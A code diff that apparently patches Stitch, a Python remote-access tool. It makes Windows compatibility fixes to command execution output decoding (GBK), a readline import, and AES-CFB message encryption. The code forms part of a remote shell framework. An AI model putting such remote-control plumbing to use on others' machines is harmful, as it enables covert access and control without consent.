@@ -27,11 +27,11 @@ from .Stitch_Vars.st_aes import *
 if sys.platform.startswith('win'):
     # 初始化彩色cmd
     init()
-    import gnureadline # 一个第三方库 只能在linux上使用
+    import readline # 一个第三方库 win上对应的库是pyreadline
     import win32crypt
     p_bar = '='
     temp = 'C:\\Windows\\Temp\\'
-    gnureadline.parse_and_bind('tab: complete')
+    readline.parse_and_bind('tab: complete')
 else:
     temp = '/tmp/'
     import gnureadline
@@ -59,8 +59,16 @@ def run_command(command):
             if subp_output == '':
                 return '[+] Command successfully executed.\n'
             else:
-                return subp_output.decode()
-        return f"[!] {errors.decode()}"
+                if sys.platform.startswith('win'):
+                    return subp_output.decode('gbk')
+                else:
+                    return subp_output.decode()
+        else:
+            if sys.platform.startswith('win'):
+                return f"[!] {errors.decode('gbk')}"
+            else:
+                return f"[!] {errors.decode()}"
+
     except KeyboardInterrupt:
         print('Terminated command.')
 
@@ -82,7 +90,11 @@ def encrypt(raw, aes_key=secret):
     # 生成一个16位二进制字符
     iv = Random.new().read(AES.block_size)
     cipher = AES.new(aes_key, AES.MODE_CFB, iv)
-    return (base64.b64encode(iv + cipher.encrypt(raw)))
+    if type(raw) is not bytes:
+        b_raw = cipher.encrypt(raw.encode())
+    else:
+        b_raw = cipher.encrypt(raw)
+    return (base64.b64encode(iv + b_raw))
 
 def decrypt(enc, aes_key=secret):
     enc = base64.b64decode(enc)
